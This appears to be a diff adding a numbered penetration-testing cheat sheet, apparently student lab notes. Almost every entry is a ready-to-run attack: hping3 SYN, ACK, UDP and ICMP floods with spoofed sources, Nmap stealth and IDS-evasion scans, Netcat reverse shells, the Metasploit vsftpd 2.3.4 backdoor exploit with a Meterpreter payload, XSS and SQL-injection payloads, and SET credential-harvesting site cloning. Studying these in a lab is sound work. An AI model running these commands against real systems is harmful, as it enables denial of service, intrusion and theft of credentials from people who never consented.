@@ -1,0 +1,134 @@
+1. Stealth scan using Nmap (SYN scan)
+nmap -sS <target-ip>
+
+2. File transfer with Netcat
+Receiver: nc -lvp 1234 > received_file.txt
+Sender: nc <receiver-ip> 1234 < file.txt
+
+3. SYN flood with randomized source IPs (Hping3)
+hping3 -S --flood --rand-source -p 80 <target-ip>
+
+4. DOM XSS via URL
+http://example.com/page?default=<script>alert('XSS')</script>
+
+5. VirusTotal + PE Studio analysis
+Use VirusTotal web upload + PE Studio inspection
+
+6. Bypass <script> filter
+<img src=x onerror=alert('XSS')>
+
+7. Metasploit for vsftpd 2.3.4
+msfconsole
+search vsftpd
+
+8. FIN+PSH+URG flags with Hping3
+hping3 -F -P -U --flood -p 80 <target-ip>
+
+9. TCP ACK flood
+hping3 -A --flood -p 80 <target-ip>
+
+10. UDP flood on DNS port
+hping3 --udp --flood -p 53 <target-ip>
+
+11. Compare two .exe files
+Analyze with PE Studio and compare VirusTotal results
+
+12. Stored XSS payload
+<script>alert('Stored XSS')</script>
+
+13. OS detection with Nmap
+nmap -O <target-ip>
+
+14. Nmap vuln scan
+nmap --script vuln <target-ip>
+
+15. Comprehensive service scan
+nmap -A <target-ip>
+
+16. Slow SYN flood (10ms)
+hping3 -S -i u10000 -p 80 <target-ip>
+
+17. Remote shell with Netcat
+nc -lvp 4444 (listener)
+nc <listener-ip> 4444 -e /bin/bash (sender)
+
+18. Basic SYN flood
+hping3 -S --flood -p 80 <target-ip>
+
+19. SET phishing
+sudo setoolkit -> Social Engineering -> Credential Harvester -> Site Cloner
+
+20. Service version detection
+nmap -sV <target-ip>
+
+21. Netcat reverse shell
+nc -lvp 4444 (listener)
+nc <ip> 4444 -e /bin/bash
+
+23. Netcat port check
+nc -zv <target-ip> <port>
+
+24. Metasploit vsftpd 2.3.4 exploit
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOST <target>
+set LHOST <you>
+run
+
+25. Stealthy scan timing
+nmap -T0 <target-ip>
+
+26. SYN flood with source port 443
+hping3 -S --flood -p 80 -s 443 <target-ip>
+
+27. DVWA XSS input
+<script>alert(1)</script>
+
+28. Netcat practical
+Port scan: nc -zv <ip> 20-1000
+File transfer: nc -lvp 5555 > file.txt / nc <ip> 5555 < file.txt
+
+29. TCP connect scan
+nmap -sT <target-ip>
+
+30. XSS with image tag
+<img src=x onerror=alert('XSS')>
+
+31. Netcat port test + risk
+nc -zv <ip> <port>
+
+32. Stealth scan + service detection
+nmap -sS -sV <target-ip>
+
+33. SQLi login bypass
+' OR '1'='1
+
+34. Stealth OS detection
+nmap -sS -O <target-ip>
+
+35. Meterpreter setup
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+set LHOST <your-ip>
+set LPORT 4444
+
+36. XSS in form
+<script>alert('XSS')</script>
+
+37. Aggressive Nmap scan
+nmap -T4 -A <target-ip>
+
+38. Analyze .exe with PE Studio + VirusTotal
+Look for headers, packers, VirusTotal hits
+
+39. ICMP Echo Request flood
+hping3 -1 --flood <target-ip>
+
+40. IDS evasion (fragmentation + slow)
+nmap -sS -f -T0 <target-ip>
+
+41. Full recon + vuln detection
+nmap -sS -sV -O --script vuln <target-ip>
+
+22. Stored and Reflected XSS examples
+Stored: <script>alert('Stored XSS')</script>
+Reflected: http://site.com?q=<script>alert('Reflected XSS')</script>
+
